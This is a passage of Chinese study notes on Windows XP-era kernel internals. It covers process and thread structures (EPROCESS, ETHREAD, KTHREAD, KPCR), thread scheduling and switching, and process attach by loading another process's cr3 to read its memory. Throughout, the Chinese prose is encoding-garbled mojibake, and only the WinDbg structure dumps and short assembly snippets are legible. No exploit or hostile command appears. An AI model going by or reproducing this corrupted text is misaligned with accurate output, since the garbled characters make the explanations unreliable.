¸å¯¹è±¡çš„åœ°å€ã€‚\nImageFileName\nEPROCESS[0x174]ï¼Œè¿›ç¨‹é•œåƒæ–‡ä»¶åï¼Œæœ€å¤š16ä¸ªå­—èŠ‚ã€‚\nActiveThreads\nEPROCESS[0x1a0]ï¼Œæ´»åŠ¨çº¿ç¨‹çš„æ•°é‡ã€‚\nPeb\nEPROCESS[0x1b0]ï¼Œè¿›ç¨‹ç¯å¢ƒå—ï¼Œæ˜¯è¿›ç¨‹åœ¨3ç¯çš„ä¸€ä¸ªç»“æ„ä½“ï¼Œé‡Œé¢åŒ…å«äº†è¿›ç¨‹çš„æ¨¡å—åˆ—è¡¨ã€æ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€ç­‰ä¿¡æ¯ã€‚\nåœ¨PEB[0xc]å¤„ä¸º+0x00c Ldr : Ptr32 _PEB_LDR_DATA\nçœ‹ä¸€ä¸‹è¿™ä¸ªç»“æ„ï¼Œæœ‰ä¸‰ä¸ªåŒå‘é“¾è¡¨ï¼š\nkd\u003e dt _PEB_LDR_DATA ntdll!_PEB_LDR_DATA +0x000 Length : Uint4B +0x004 Initialized : UChar +0x008 SsHandle : Ptr32 Void +0x00c InLoadOrderModuleList : _LIST_ENTRY +0x014 InMemoryOrderModuleList : _LIST_ENTRY +0x01c InInitializationOrderModuleList : _LIST_ENTRY +0x024 EntryInProgress : Ptr32 Void InLoadOrderModuleListï¼šè¯¥æ¨¡å—åŠ è½½çš„é¡ºåº\nInMemoryOrderModuleListï¼šè¯¥æ¨¡å—åœ¨å†…å­˜ä¸­çš„é¡ºåº\nInInitializationOrderModuleListï¼šè¯¥æ¨¡å—åˆå§‹åŒ–çš„é¡ºåº\nçº¿ç¨‹ç»“æ„ä½“ ETHREAD\næ¯ä¸ªçº¿ç¨‹å¯¹äºçš„ç»“æ„ä½“ï¼š\nkd\u003e dt _ETHREAD ntdll!_ETHREAD +0x000 Tcb : _KTHREAD +0x1c0 CreateTime : _LARGE_INTEGER +0x1c0 NestedFaultCount : Pos 0, 2 Bits +0x1c0 ApcNeeded : Pos 2, 1 Bit +0x1c8 ExitTime : _LARGE_INTEGER +0x1c8 LpcReplyChain : _LIST_ENTRY +0x1c8 KeyedWaitChain : _LIST_ENTRY +0x1d0 ExitStatus : Int4B +0x1d0 OfsChain : Ptr32 Void +0x1d4 PostBlockList : _LIST_ENTRY +0x1dc TerminationPort : Ptr32 _TERMINATION_PORT +0x1dc ReaperLink : Ptr32 _ETHREAD +0x1dc KeyedWaitValue : Ptr32 Void +0x1e0 ActiveTimerListLock : Uint4B +0x1e4 ActiveTimerListHead : _LIST_ENTRY +0x1ec Cid : _CLIENT_ID +0x1f4 LpcReplySemaphore : _KSEMAPHORE +0x1f4 KeyedWaitSemaphore : _KSEMAPHORE +0x208 LpcReplyMessage : Ptr32 Void +0x208 LpcWaitingOnPort : Ptr32 Void +0x20c ImpersonationInfo : Ptr32 _PS_IMPERSONATION_INFORMATION +0x210 IrpList : _LIST_ENTRY +0x218 TopLevelIrp : Uint4B +0x21c DeviceToVerify : Ptr32 _DEVICE_OBJECT +0x220 ThreadsProcess : Ptr32 _EPROCESS +0x224 StartAddress : Ptr32 Void +0x228 Win32StartAddress : Ptr32 Void +0x228 LpcReceivedMessageId : Uint4B +0x22c ThreadListEntry : _LIST_ENTRY +0x234 RundownProtect : _EX_RUNDOWN_REF +0x238 ThreadLock : _EX_PUSH_LOCK +0x23c LpcReplyMessageId : Uint4B +0x240 ReadClusterSize : Uint4B +0x244 GrantedAccess : Uint4B +0x248 CrossThreadFlags : Uint4B +0x248 Terminated : Pos 0, 1 Bit +0x248 DeadThread : Pos 1, 1 Bit +0x248 HideFromDebugger : Pos 2, 1 Bit +0x248 ActiveImpersonationInfo : Pos 3, 1 Bit +0x248 SystemThread : Pos 4, 1 Bit +0x248 HardErrorsAreDisabled : Pos 5, 1 Bit +0x248 BreakOnTermination : Pos 6, 1 Bit +0x248 SkipCreationMsg : Pos 7, 1 Bit +0x248 SkipTerminationMsg : Pos 8, 1 Bit +0x24c SameThreadPassiveFlags : Uint4B +0x24c ActiveExWorker : Pos 0, 1 Bit +0x24c ExWorkerCanWaitUser : Pos 1, 1 Bit +0x24c MemoryMaker : Pos 2, 1 Bit +0x250 SameThreadApcFlags : Uint4B +0x250 LpcReceivedMsgIdValid : Pos 0, 1 Bit +0x250 LpcExitThreadCalled : Pos 1, 1 Bit +0x250 AddressSpaceOwner : Pos 2, 1 Bit +0x254 ForwardClusterOnly : UChar +0x255 DisablePageFaultClustering : UChar ç¬¬ä¸€ä¸ªå­æˆå‘˜ä¸ºKTHREADï¼š\nkd\u003e dt _KTHREAD ntdll!_KTHREAD +0x000 Header : _DISPATCHER_HEADER +0x010 MutantListHead : _LIST_ENTRY +0x018 InitialStack : Ptr32 Void +0x01c StackLimit : Ptr32 Void +0x020 Teb : Ptr32 Void +0x024 TlsArray : Ptr32 Void +0x028 KernelStack : Ptr32 Void +0x02c DebugActive : UChar +0x02d State : UChar +0x02e Alerted : [2] UChar +0x030 Iopl : UChar +0x031 NpxState : UChar +0x032 Saturation : Char +0x033 Priority : Char +0x034 ApcState : _KAPC_STATE +0x04c ContextSwitches : Uint4B +0x050 IdleSwapBlock : UChar +0x051 Spare0 : [3] UChar +0x054 WaitStatus : Int4B +0x058 WaitIrql : UChar +0x059 WaitMode : Char +0x05a WaitNext : UChar +0x05b WaitReason : UChar +0x05c WaitBlockList : Ptr32 _KWAIT_BLOCK +0x060 WaitListEntry : _LIST_ENTRY +0x060 SwapListEntry : _SINGLE_LIST_ENTRY +0x068 WaitTime : Uint4B +0x06c BasePriority : Char +0x06d DecrementCount : UChar +0x06e PriorityDecrement : Char +0x06f Quantum : Char +0x070 WaitBlock : [4] _KWAIT_BLOCK +0x0d0 LegoData : Ptr32 Void +0x0d4 KernelApcDisable : Uint4B +0x0d8 UserAffinity : Uint4B +0x0dc SystemAffinityActive : UChar +0x0dd PowerState : UChar +0x0de NpxIrql : UChar +0x0df InitialNode : UChar +0x0e0 ServiceTable : Ptr32 Void +0x0e4 Queue : Ptr32 _KQUEUE +0x0e8 ApcQueueLock : Uint4B +0x0f0 Timer : _KTIMER +0x118 QueueListEntry : _LIST_ENTRY +0x120 SoftAffinity : Uint4B +0x124 Affinity : Uint4B +0x128 Preempted : UChar +0x129 ProcessReadyQueue : UChar +0x12a KernelStackResident : UChar +0x12b NextProcessor : UChar +0x12c CallbackStack : Ptr32 Void +0x130 Win32Thread : Ptr32 Void +0x134 TrapFrame : Ptr32 _KTRAP_FRAME +0x138 ApcStatePointer : [2] Ptr32 _KAPC_STATE +0x140 PreviousMode : Char +0x141 EnableStackSwap : UChar +0x142 LargeStack : UChar +0x143 ResourceIndex : UChar +0x144 KernelTime : Uint4B +0x148 UserTime : Uint4B +0x14c SavedApcState : _KAPC_STATE +0x164 Alertable : UChar +0x165 ApcStateIndex : UChar +0x166 ApcQueueable : UChar +0x167 AutoAlignment : UChar +0x168 StackBase : Ptr32 Void +0x16c SuspendApc : _KAPC +0x19c SuspendSemaphore : _KSEMAPHORE +0x1b0 ThreadListEntry : _LIST_ENTRY +0x1b8 FreezeCount : Char +0x1b9 SuspendCount : Char +0x1ba IdealProcessor : UChar +0x1bb DisableBoost : UChar KTHREADä¸­ä¸€äº›é‡è¦çš„æˆå‘˜ï¼š\nHeader\nKPROCESSçš„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼Œä»¥å®ƒå¼€å¤´çš„å†…æ ¸å¯¹è±¡å¯ä»¥è¢«WaitForSingleObjectå‡½æ•°æ‰€ç­‰å¾…ï¼ˆæ¯”å¦‚Mutexäº’æ–¥ä½“ï¼ŒEventäº‹ä»¶ç­‰ï¼‰\n+0x018 InitialStack : Ptr32 Void +0x01c StackLimit : Ptr32 Void +0x028 KernelStack : Ptr32 Void ä¸çº¿ç¨‹åˆ‡æ¢ç›¸å…³\n+0x020 Teb : Ptr32 Void çº¿ç¨‹ç¯å¢ƒå—ï¼Œå¤§å°4KBï¼Œä½äºç”¨æˆ·åœ°å€ç©ºé—´ã€‚FS:[0] -\u003e TEBï¼ˆä¸‰ç¯æ—¶ï¼Œé›¶ç¯æ—¶ä¸ºKPCRï¼‰\n+0x02c DebugActive : UChar å¦‚æœå€¼ä¸º-1ï¼Œå°±ä¸èƒ½ä½¿ç”¨è°ƒè¯•å¯„å­˜å™¨ï¼šDr0~Dr7\n+0x034 ApcState : _KAPC_STATE +0x0e8 ApcQueueLock : Uint4B +0x14c SavedApcState : _KAPC_STATE APCç›¸å…³ã€‚\n+0x02d State : UChar çº¿ç¨‹çŠ¶æ€ï¼Œå°±ç»ªã€ç­‰å¾…è¿˜æ˜¯è¿è¡Œã€‚\n+0x06c BasePriority : Char å…¶åˆå§‹å€¼æ‰€å±è¿›ç¨‹çš„KPROCESS -\u003e BasePriorityå€¼ï¼Œä»¥åå¯ä»¥é€šè¿‡KeSetBasePriorityThread()å‡½æ•°é‡æ–°è®¾å®šã€‚\n+0x070 WaitBlock : [4] _KWAIT_BLOCK WaitForSingleObject()ç­‰å¾…å“ªä¸ªå¯¹è±¡ã€‚\n+0x0e0 ServiceTable : Ptr32 Void æŒ‡å‘ç³»ç»ŸæœåŠ¡è¡¨åŸºåœ°å€ã€‚\n+0x134 TrapFrame : Ptr32 _KTRAP_FRAME è¿›0ç¯æ—¶ä¿å­˜ç¯å¢ƒã€‚\n+0x140 PreviousMode : Char å…ˆå‰æ¨¡å¼ã€‚\n+0x1b0 ThreadListEntry : _LIST_ENTRY åŒå‘é“¾è¡¨ä¸€ä¸ªè¿›ç¨‹æ‰€æœ‰çš„çº¿ç¨‹ï¼Œéƒ½æŒ‚åœ¨ä¸€ä¸ªé“¾è¡¨ä¸­ï¼ŒæŒ‚çš„å°±æ˜¯è¿™ä¸ªä½ç½®ï¼Œä¸€å…±æœ‰ä¸¤ä¸ªè¿™æ ·çš„é“¾è¡¨ã€‚\nç»“æ„å¦‚ä¸‹ï¼š\nETHREADä¸­ä¸€äº›é‡è¦çš„æˆå‘˜ï¼š\n+0x1ec Cid : _CLIENT_ID ntdll!_CLIENT_ID +0x000 UniqueProcess : Ptr32 Void\t//è¿™ä¸ªçº¿ç¨‹å±äºå“ªä¸ªè¿›ç¨‹ +0x004 UniqueThread : Ptr32 Void è¿›ç¨‹IDï¼Œçº¿ç¨‹ID\n+0x220 ThreadsProcess : Ptr32 _EPROCESS æŒ‡å‘è‡ªå·±æ‰€å±çš„è¿›ç¨‹ã€‚\n+0x22c ThreadListEntry : _LIST_ENTRY åŒå‘é“¾è¡¨ä¸€ä¸ªè¿›ç¨‹æ‰€æœ‰çš„çº¿ç¨‹ï¼Œéƒ½æŒ‚åœ¨ä¸€ä¸ªé“¾è¡¨ä¸­ï¼ŒæŒ‚çš„å°±æ˜¯è¿™ä¸ªä½ç½®ï¼Œä¸€å…±æœ‰ä¸¤ä¸ªè¿™æ ·çš„é“¾è¡¨ã€‚\nKPCR å½“è¿è¡Œçš„CPUéœ€è¦ä¸€äº›ç»“æ„ä½“æ¥å­˜å‚¨æ•°æ®\nå±æ€§ï¼š\nå½“è¿›å…¥0ç¯æ—¶ï¼ŒFS[0] -\u003e KPCRï¼ˆ3ç¯æŒ‡å‘TEBï¼‰ ä¸€ä¸ªCPUä¸€ä¸ªKPCRã€‚ KPCRå­˜å‚¨äº†CPUéœ€è¦çš„ä¸€äº›é‡è¦çš„æ•°æ®ï¼šGDTã€IDTå’Œçº¿ç¨‹ç›¸å…³çš„ä¸€äº›ä¿¡æ¯ã€‚ ç»“æ„ï¼š\nkd\u003e dt _KPCR nt!_KPCR +0x000 NtTib : _NT_TIB +0x01c SelfPcr : Ptr32 _KPCR +0x020 Prcb : Ptr32 _KPRCB +0x024 Irql : UChar +0x028 IRR : Uint4B +0x02c IrrActive : Uint4B +0x030 IDR : Uint4B +0x034 KdVersionBlock : Ptr32 Void +0x038 IDT : Ptr32 _KIDTENTRY +0x03c GDT : Ptr32 _KGDTENTRY +0x040 TSS : Ptr32 _KTSS +0x044 MajorVersion : Uint2B +0x046 MinorVersion : Uint2B +0x048 SetMember : Uint4B +0x04c StallScaleFactor : Uint4B +0x050 DebugActive : UChar +0x051 Number : UChar +0x052 Spare0 : UChar +0x053 SecondLevelCacheAssociativity : UChar +0x054 VdmAlert : Uint4B +0x058 KernelReserved : [14] Uint4B +0x090 SecondLevelCacheSize : Uint4B +0x094 HalReserved : [16] Uint4B +0x0d4 InterruptMode : Uint4B +0x0d8 Spare1 : UChar +0x0dc KernelReserved2 : [17] Uint4B +0x120 PrcbData : _KPRCB ç¬¬ä¸€ä¸ªå­æˆå‘˜ä¸ºNT_TIBï¼š\nkd\u003e dt _NT_TIB ntdll!_NT_TIB +0x000 ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD +0x004 StackBase : Ptr32 Void +0x008 StackLimit : Ptr32 Void +0x00c SubSystemTib : Ptr32 Void +0x010 FiberData : Ptr32 Void +0x010 Version : Uint4B +0x014 ArbitraryUserPointer : Ptr32 Void +0x018 Self : Ptr32 _NT_TIB NT_TIBä¸­ä¸€äº›é‡è¦çš„æˆå‘˜ï¼š\n+0x000 ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD å½“å‰çº¿ç¨‹å†…æ ¸å¼‚å¸¸å¤„ç†çš„é“¾è¡¨ã€‚\n+0x004 StackBase : Ptr32 Void +0x008 StackLimit : Ptr32 Void å½“å‰çº¿ç¨‹å†…æ ¸çš„æ ˆåŸºå€ä¸å¤§å°ã€‚\n+0x018 Self : Ptr32 _NT_TIB æŒ‡å‘è‡ªå·±ï¼Œæ–¹ä¾¿æŸ¥æ‰¾ã€‚\nKPCRä¸­ä¸€äº›é‡è¦çš„æˆå‘˜ï¼š\n+0x01c SelfPcr : Ptr32 _KPCR æŒ‡å‘è‡ªå·±ï¼Œæ–¹ä¾¿æŸ¥æ‰¾ã€‚\n+0x020 Prcb : Ptr32 _KPRCB æŒ‡å‘æ‰©å±•ç»“æ„PRCBã€‚\n+0x038 IDT : Ptr32 _KIDTENTRY æŒ‡å‘IDTè¡¨ã€‚\n+0x03c GDT : Ptr32 _KGDTENTRY æŒ‡å‘GDTè¡¨ã€‚\n+0x040 TSS : Ptr32 _KTSS æŒ‡å‘TSSï¼Œæ¯ä¸ªCPUéƒ½æœ‰ä¸€ä¸ªTSSã€‚\n+0x051 Number : UChar CPUç¼–å·ã€‚\n+0x120 PrcbData : _KPRCB æ‰©å±•ç»“æ„ä½“ã€‚\nç­‰å¾…çº¿ç¨‹_è°ƒåº¦çº¿ç¨‹ CPUå¦‚ä½•è°ƒåº¦çº¿ç¨‹\nç­‰å¾…é“¾è¡¨\nkd\u003e dd KiWaitListHead çº¿ç¨‹è°ƒç”¨äº†Sleep()æˆ–è€…WaitForSingleObject()æ—¶ï¼Œå°±æŒ‚åˆ°è¿™ä¸ªé“¾è¡¨ã€‚\nçº¿ç¨‹æœ‰3ç§çŠ¶æ€ï¼šå°±ç»ªã€ç­‰å¾…ã€è¿è¡Œã€‚\næ­£åœ¨è¿è¡Œç§çš„çº¿ç¨‹å­˜å‚¨åœ¨KPCRä¸­ï¼Œå°±ç»ªå’Œç­‰å¾…çš„çº¿ç¨‹å…¨éƒ¨åœ¨å¦å¤–çš„33ä¸ªé“¾è¡¨ä¸­ã€‚ä¸€ä¸ªç­‰å¾…é“¾è¡¨ï¼Œ32ä¸ªå°±ç»ªé“¾è¡¨ã€‚\nè°ƒåº¦é“¾è¡¨\nkd\u003e dd KiDispatcherReadyListHead L70 è¿™å…¶ä¸­æ¯ä¸€ä¸ªé“¾è¡¨éƒ½å­˜å‚¨ä¸åŒçº§åˆ«çš„çº¿ç¨‹ã€‚ï¼ˆ0~31çº§ï¼‰\nï¼ˆå¦‚æœfd = bk = å½“å‰åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸ªé“¾è¡¨ä¸ºç©ºã€‚æˆ‘ä»¬çœ‹çš„æ—¶å€™å¤„äºè°ƒè¯•çŠ¶æ€ï¼Œå…¨éƒ¨çš„çº¿ç¨‹éƒ½ä¼šæŒ‚èµ·ï¼Œæ‰€ä»¥éƒ½æ˜¯ç©ºçš„ã€‚ï¼‰\n32ä½ç³»ç»Ÿæœ‰32ä¸ªå°±ç»ªé“¾è¡¨ï¼Œ64ä½ç³»ç»Ÿå°±æœ‰64ä¸ªå°±ç»ªé“¾è¡¨ã€‚\næ­£åœ¨è¿è¡Œçš„çº¿ç¨‹åœ¨KPCRä¸­ã€‚\nè¿™ä¸¤ä¸ªç»“æ„æŒ‚è½½åœ¨_KTHREAD[0x60]\n+0x060 WaitListEntry : _LIST_ENTRY //ç­‰å¾… +0x060 SwapListEntry : _SINGLE_LIST_ENTRY //æŒ‚èµ· ä¸»åŠ¨åˆ‡æ¢ windowsä¸­ç»å¤§éƒ¨åˆ†APIéƒ½è°ƒç”¨äº†SwapContextå‡½æ•°ï¼Œå½“çº¿ç¨‹åªè¦è°ƒç”¨äº†APIï¼Œå°±ä¼šå¯¼è‡´çº¿ç¨‹åˆ‡æ¢ã€‚ çº¿ç¨‹åˆ‡æ¢æ—¶ä¼šæ¯”è¾ƒæ˜¯å¦å±äºåŒä¸€è¿›ç¨‹ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ‡æ¢Cr3ï¼ŒCr3æ¢äº†ï¼Œè¿›ç¨‹ä¹Ÿå°±åˆ‡æ¢äº†ã€‚ æ—¶é’Ÿä¸­æ–­åˆ‡æ¢ å¦‚ä½•ä¸­æ–­ä¸€ä¸ªæ­£åœ¨æ‰§è¡Œçš„ç¨‹åºï¼š\nå¼‚å¸¸ï¼ˆç¼ºé¡µä¸int nï¼‰ ä¸­æ–­ï¼ˆæ—¶é’Ÿä¸­æ–­ï¼‰ ç³»ç»Ÿæ—¶é’Ÿ\nï¼ˆIDTï¼‰ä¸­æ–­å· IRQ è¯´æ˜ 0x30 IRQ0 æ—¶é’Ÿä¸­æ–­ æ“ä½œç³»ç»Ÿæ¯éš”10~20æ¯«ç§’ä¼šè§¦å‘ä¸€æ¬¡æ—¶é’Ÿä¸­æ–­ï¼Œå¯ä»¥é€šè¿‡GetSystemTimeAdjustmentè·å–å½“å‰æ“ä½œç³»ç»Ÿçš„æ—¶é’Ÿé—´éš”å€¼ã€‚\næ—¶é’Ÿä¸­æ–­çš„æ‰§è¡Œæµç¨‹\nKiStartUnexpectedRange â€“\u003e KiEndUnexpectedRange â€“\u003e KiUnexpectedInterruptTail â€“\u003e HalBeginSystemInterrupt â€“\u003e HalEndSystemInterrupt â€“\u003e KiDispatchInterrupt â€“\u003e SwapContext\næ€»ç»“\nçº¿ç¨‹åˆ‡æ¢çš„å‡ ç§æ–¹å¼ï¼š\nä¸»åŠ¨è°ƒç”¨APIå‡½æ•° æ—¶é’Ÿä¸­æ–­ å¼‚å¸¸å¤„ç† å¦‚æœä¸€ä¸ªçº¿ç¨‹ä¸è°ƒç”¨APIï¼Œåœ¨ä»£ç ä¸­å±è”½ä¸­æ–­ï¼ˆCLIæŒ‡ä»¤ï¼‰ï¼Œå¹¶ä¸”ä¸ä¼šå‡ºç°å¼‚å¸¸ï¼Œé‚£ä¹ˆè¯¥çº¿ç¨‹å°†æ°¸ä¹…å æœ‰CPUï¼Œå•æ ¸å æœ‰ç‡ä¸º100%ï¼ŒåŒæ ¸å æœ‰ç‡ä¸º50%ã€‚\næ—¶é—´ç‰‡ç®¡ç† æ—¶é’Ÿä¸­æ–­æ—¶æœ‰ä¸¤ç§æƒ…å†µä¼šå¯¼è‡´çº¿ç¨‹åˆ‡æ¢ï¼š\nå½“å‰çš„CPUæ—¶é—´ç‰‡åˆ°æœŸ æœ‰å¤‡ç”¨çº¿ç¨‹ï¼ˆKPCR.PrcbData.NextThreadï¼‰ ä»€ä¹ˆæ˜¯CPUæ—¶é—´ç‰‡ï¼Ÿ\nå½“ä¸€ä¸ªæ–°çº¿ç¨‹å¼€å§‹æ‰§è¡Œæ—¶ï¼Œåˆå§‹åŒ–ç¨‹åºä¼šåœ¨_KTHREAD.Quantumèµ‹åˆå§‹å€¼ï¼Œè¯¥å€¼å¤§å°ç”±_KPROCESS.ThreadQuantumå†³å®šã€‚ æ¯æ¬¡æ—¶é’Ÿä¸­æ–­ä¼šè°ƒç”¨KeUpdateRunTimeå‡½æ•°ï¼Œè¯¥å‡½æ•°æ¯æ¬¡å°†å½“å‰çº¿ç¨‹çš„Quantumå‡å°‘3ä¸ªå•ä½ã€‚å¦‚æœå‡åˆ°0ï¼Œå°±å°†KPCR.PrcbData.QuantumEndï¼ˆæ ‡å¿—å½“å‰CPUæ—¶é—´ç‰‡æ˜¯å¦ç”¨å®Œï¼Œæ²¡ç”¨å®Œæ˜¯0ï¼‰çš„å€¼è®¾ç½®ä¸ºé0ã€‚ æ¯æ¬¡ç³»ç»Ÿæ—¶é’Ÿæ‰§è¡Œå®Œæ¯•åéƒ½ä¼šæ‰§è¡ŒKiDispatchInterruptï¼Œæ¥åˆ¤æ–­æ—¶é—´ç‰‡æ˜¯å¦åˆ°æœŸã€‚ æ—¶é—´ç‰‡åˆ°æœŸåä¼šè°ƒç”¨KiQuantumEndé‡æ–°è®¾ç½®æ—¶é—´ç‰‡ï¼Œæ‰¾åˆ°è¦è¿è¡Œçš„çº¿ç¨‹ graph TB A[KeUpdateRunTime] --\u003e B[KiDispatchInterruptï¼ˆæ—¶é—´ç‰‡æ˜¯å¦åˆ°æœŸ?ï¼‰]; B --å¦--\u003e A B --æ˜¯--\u003e D[KiQuantumEnd] çº¿ç¨‹åˆ‡æ¢çš„å‡ ç§æ–¹å¼ï¼š\nå½“å‰çº¿ç¨‹ä¸»åŠ¨è°ƒç”¨APIå‡½æ•°\nAPIå‡½æ•° â€“\u003e KiSwapThread â€“\u003e KiSwapContext â€“\u003e SwapContext\nå½“å‰çš„CPUæ—¶é—´ç‰‡åˆ°æœŸ\nKiDispatchInterrupt â€“\u003e KiQuantumEnd â€“\u003e KiSwapContext â€“\u003e SwapContext\næœ‰å¤‡ç”¨çº¿ç¨‹ï¼ˆKPCR.PrcbData.NextThreadï¼‰\nKiDispatchInterrupt â€“\u003e SwapContext\nçº¿ç¨‹åˆ‡æ¢TSS å†…æ ¸å †æ ˆ\nåœ¨_KTHREADç»“æ„ä½“ä¸­å­˜åœ¨å†…æ ¸å †æ ˆçš„ä¸‰ä¸ªæˆå‘˜ï¼š\nntdll!_KTHREAD +0x018 InitialStack : Ptr32 Void //æ ˆåº• +0x01c StackLimit : Ptr32 Void //æ ˆçš„è¾¹ç•Œ +0x028 KernelStack : Ptr32 Void //æ ˆé¡¶ åœ¨å†…å­˜ä¸­å¦‚ä¸‹ï¼š\nè°ƒç”¨APIè¿›0ç¯\næ™®é€šè°ƒç”¨ï¼šé€šè¿‡TSS.ESP0å¾—åˆ°0ç¯å †æ ˆ\nå¿«é€Ÿè°ƒç”¨ï¼šä»MSRå¾—åˆ°ä¸€ä¸ªä¸´æ—¶0ç¯æ ˆï¼Œä»£ç æ‰§è¡Œåä»ç„¶é€šè¿‡TSS.ESP0å¾—åˆ°å½“å‰çº¿ç¨‹0ç¯å †æ ˆ\nçº¿ç¨‹åˆ‡æ¢FS ç³»ç»Ÿä¸­å­˜åœ¨ç€è®¸å¤šçš„çº¿ç¨‹ï¼Œè¿™å°±æ„å‘³ç€FS:[0]åœ¨3ç¯æ—¶æŒ‡å‘çš„TEBè¦æœ‰å¤šä¸ªï¼ˆæ¯ä¸ªçº¿ç¨‹ä¸€ä»½ï¼‰ï¼ŒFSçš„æ®µé€‰æ‹©å­éƒ½ç›¸åŒï¼Œå¦‚ä½•å®ç°ä½¿ç”¨ä¸€ä¸ªFSå¯„å­˜å™¨æŒ‡å‘å¤šä¸ªTEBï¼Ÿ\n.text:004049D7 mov eax, [ebx+18h] ; TEB .text:004049DA mov ecx, [ebx+3Ch] ; GDT .text:004049DD mov [ecx+3Ah], ax .text:004049E1 shr eax, 10h .text:004049E4 mov [ecx+3Ch], al .text:004049E7 mov [ecx+3Fh], ah ç›¸å½“äºæ”¹äº†å¯¹åº”æ®µæè¿°ç¬¦çš„baseï¼ˆä¸‰éƒ¨åˆ†ï¼‰ï¼Œä½¿å®ƒæŒ‡å‘ä¸åŒçš„TEBã€‚\nçº¿ç¨‹ä¼˜å…ˆçº§ åœ¨KiSwapThreadä¸KiQuantumEndå‡½æ•°ä¸­ï¼Œéƒ½æ˜¯é€šè¿‡KiFindReadyThreadæ¥æ‰¾ä¸‹ä¸€ä¸ªè¦åˆ‡æ¢çš„çº¿ç¨‹çš„ï¼ŒKiFindReadyThreadæ˜¯æ ¹æ®ä»€ä¹ˆæ¡ä»¶æ¥é€‰æ‹©ä¸‹ä¸€ä¸ªè¦æ‰§è¡Œçš„çº¿ç¨‹çš„ï¼Ÿ\nKiFindReadyThreadæŸ¥æ‰¾æ–¹å¼ï¼š\næŒ‰ç…§ä¼˜å…ˆçº§æ¥æŸ¥æ‰¾ï¼š31 -\u003e 30 -\u003e 29 -\u003e â€¦â€¦\nå¦‚æœ31çº§åˆ«çš„é“¾è¡¨ä¸­æœ‰çº¿ç¨‹ï¼Œé‚£ä¹ˆå°±ä¸ä¼šæŸ¥æ‰¾æ¯”å®ƒçº§åˆ«ä½çš„é“¾è¡¨çš„ã€‚ï¼ˆæ¯ä¸€æ¬¡åªæŸ¥æ‰¾æœ€é«˜çš„ï¼‰\nä¼˜åŒ–\nè°ƒåº¦é“¾è¡¨æœ‰32ä¸ªï¼Œæ¯æ¬¡ä»å¤´å¼€å§‹æ‰¾æ•ˆç‡å¤ªä½ï¼ŒWindowsé€šè¿‡ä¸€ä¸ªDWORDç±»å‹çš„å˜é‡æ¥è®°å½•ã€‚\nå½“å‘è°ƒåº¦é“¾è¡¨ä¸­æŒ‚å…¥æˆ–æ‘˜é™¤æŸä¸ªè¿›ç¨‹æ—¶ï¼Œä¼šåˆ¤æ–­å½“å‰é“¾è¡¨æ˜¯å¦ä¸ºç©ºï¼ˆfd = bk = å½“å‰åœ°å€ï¼‰ï¼Œå¦‚æœä¸ºç©ºå°±å°†DWORDå˜é‡çš„å¯¹åº”ä½ç½®0ï¼Œå¦åˆ™ç½®1ã€‚\nå˜é‡åï¼š_KiReadySummary\næ²¡æœ‰å°±ç»ªçº¿ç¨‹æ€ä¹ˆåŠï¼Ÿ\n//PrcbData kd\u003e dt _KPRCB ntdll!_KPRCB +0x000 MinorVersion : Uint2B +0x002 MajorVersion : Uint2B +0x004 CurrentThread : Ptr32 _KTHREAD //å½“å‰çº¿ç¨‹ +0x008 NextThread : Ptr32 _KTHREAD //ä¸‹ä¸€æ¬¡è¦è¿è¡Œçš„çº¿ç¨‹ +0x00c IdleThread : Ptr32 _KTHREAD //ç©ºé—²çº¿ç¨‹ å°±ä¼šæ‰§è¡ŒIdleThreadã€‚\nè¿›ç¨‹æŒ‚é  è¿›ç¨‹ä¸çº¿ç¨‹çš„å…³ç³»\nçº¿ç¨‹ä»£ç ï¼š\nmov eax,dword ptr ds:[0x12345678] CPUå¦‚ä½•è§£æ0x12345678è¿™ä¸ªåœ°å€ï¼Ÿ\nCPUè§£æçº¿æ€§åœ°å€ä¼šé€šè¿‡é¡µç›®å½•è¡¨æ¥æ‰¾å¯¹åº”çš„ç‰©ç†é¡µï¼Œé¡µç›®å½•è¡¨åŸºå€åœ¨cr3å¯„å­˜å™¨ä¸­ã€‚ å½“å‰cr3å¯„å­˜å™¨çš„å€¼æ¥æºäºå½“å‰çš„è¿›ç¨‹ï¼ˆ_KPROCESS.DirectoryTableBase(+0x18)ï¼‰ ä¸¤ä¸ªæŒ‡å‘å½“å‰è¿›ç¨‹çš„æŒ‡é’ˆ\nntdll!_ETHREAD +0x220 ThreadsProcess : Ptr32 _EPROCESS ntdll!_KTHREAD +0x034 ApcState : _KAPC_STATE ntdll!_KAPC_STATE +0x010 Process : Ptr32 _KPROCESS å…»çˆ¶æ¯è´Ÿè´£æä¾›cr3\nåœ¨çº¿ç¨‹åˆ‡æ¢æ—¶ï¼Œä¼šæ¯”è¾ƒ_KTHREADç»“æ„ä½“0x044å¤„æŒ‡å®šçš„EPROCESSæ˜¯å¦æ˜¯åŒä¸€ä¸ªï¼Œå¦‚æœä¸åŒï¼Œä¼šå°†0x044å¤„æŒ‡å®šçš„EPROCESSçš„DirectoryTableBaseå€¼å–å‡ºï¼Œèµ‹å€¼ç»™cr3\nçº¿ç¨‹æ‰€éœ€cr3çš„å€¼æ¥æºäº0x044å¤„æŒ‡å®šçš„EPROCESSã€‚\n0x220ï¼šè¿™ä¸ªçº¿ç¨‹æ˜¯è°åˆ›å»ºçš„ã€‚ï¼ˆäº²èº«çˆ¶æ¯ï¼‰\n0x044ï¼šè°åœ¨ä¸ºè¿™ä¸ªçº¿ç¨‹æä¾›èµ„æºã€‚ï¼ˆå…»çˆ¶æ¯ï¼‰\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¿™ä¸¤ä¸ªæŒ‡å‘åŒä¸€ä¸ªè¿›ç¨‹ã€‚\næ›´æ”¹cr3ï¼ˆè¿›ç¨‹æŒ‚é ï¼‰\nmov cr3,A.DirectoryTableBase mov eax,dword ptr ds:[0x12345678] ;è®¿é—®Aè¿›ç¨‹0x12345678åœ°å€ mov cr3,B.DirectoryTableBase mov eax,dword ptr ds:[0x12345678] ;è®¿é—®Bè¿›ç¨‹0x12345678åœ°å€ è·¨è¿›ç¨‹è¯»å†™å†…å­˜ 